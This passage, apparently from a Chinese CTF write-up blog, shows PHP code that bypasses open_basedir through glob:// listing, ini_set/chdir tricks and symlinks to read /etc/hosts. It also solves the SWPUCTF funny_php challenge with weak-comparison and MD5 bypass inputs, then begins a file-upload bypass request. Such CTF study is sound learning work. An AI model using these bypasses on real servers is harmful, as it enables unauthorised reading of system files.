class=\"token variable\">$dir_array</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$d</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$dir</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DirectoryIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'glob:///.*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$dir_array</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$d</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir_array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir_array</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$d</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$dir_array</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$dir</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'glob:///*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token variable\">$dir_array</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$d</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$dir</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FilesystemIterator</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'glob:///.*'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token variable\">$dir_array</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$d</span><span class=\"token operator\">-></span><span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">sort</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir_array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">foreach</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dir_array</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$d</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>读取文件</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">ini_get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;br>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'..'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'open_basedir'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/etc/hosts'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"4\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token function\">chdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"..\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token function\">symlink</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1/2/3/4\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"tmplink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token function\">symlink</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tmplink/../../../../etc/hosts\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"bypass\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tmplink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"tmplink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"bypass\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><h3 id=\"swpuctf-2022-新生赛funny_php\"><a class=\"anchor\" href=\"#swpuctf-2022-新生赛funny_php\">#</a> [SWPUCTF 2022 新生赛] funny_php</h3>\n<h4 id=\"md5绕过弱比较绕过\"><a class=\"anchor\" href=\"#md5绕过弱比较绕过\">#</a> MD5 绕过，弱比较绕过。</h4>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;=</span><span class=\"token number\">3</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'num'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">></span><span class=\"token number\">999999999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\":D\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'L1'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\":C\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">preg_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/NSSCTF/'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"NSSCTF\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"wow\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'L2'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_1'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!==</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_2'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Nice!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token function\">is_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"yoxi!\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                    <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'L3'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"X(\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"G\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_1'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'md5_2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'L1'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'L2'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'L3'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>:DwowNice!yoxi!NSSCTF&#123;f0639d58-6fb2-4499-846a-a3ed3a929a5f&#125;</pre></td></tr></table></figure><p>很简单：</p>\n<blockquote>\n<p>GET:</p>\n<p>/?num=1e9&amp;str=NSNSSCTFSCTF</p>\n<p>POST:</p>\n<p>md5_1=sonZ7y&amp;md5_2=aabC9RqS</p>\n</blockquote>\n<h3 id=\"moectf-2022what-are-y0u-uploading\"><a class=\"anchor\" href=\"#moectf-2022what-are-y0u-uploading\">#</a> [MoeCTF 2022]what are y0u uploading？</h3>\n<h4 id=\"文件上传截包绕过\"><a class=\"anchor\" href=\"#文件上传截包绕过\">#</a> 文件上传，截包绕过</h4>\n<p>这题主要是前端检验，直接禁 js 或者直接 bp，上传一个 f1ag.php</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>POST /upload.php HTTP/1.1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token property\">Host</span><span class=\"token punctuation\">:</span> node5.anna.nssctf.<span class=\"token property\">cn</span><span class=\"token punctuation\">:</span>28533</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token property\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token property\">http</span><span class=\"token punctuation\">:</span><span class=\"token comment\">//node5.anna.nssctf.cn:28533</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token property\">Accept-Language</span><span class=\"token punctuation\">:</span> zh-CN<span class=\"token punctuation\">,</span>zh<span class=\"token punctuation\">;</span>q=0.9</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token property\">Accept</span><span class=\"token punctuation\">:</span> text/html<span class=\"token punctuation\">,</span>application/xhtml+xml<span class=\"token punctuation\">,</span>application/xml<span class=\"token punctuation\">;</span>q=0.9<span class=\"token punctuation\">,</span>image/avif<span class=\"token punctuation\">,</span>image/webp<span class=\"token punctuation\">,</span>image/apng<span class=\"token punctuation\">,</span>*/*<span class=\"token punctuation\">;</span>q=0.8<span class=\"token punctuation\">,</span>application/signed-exchange<span class=\"token punctuation\">;</span>v=b3<span class=\"token punctuation\">;</span>q=0.7</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token 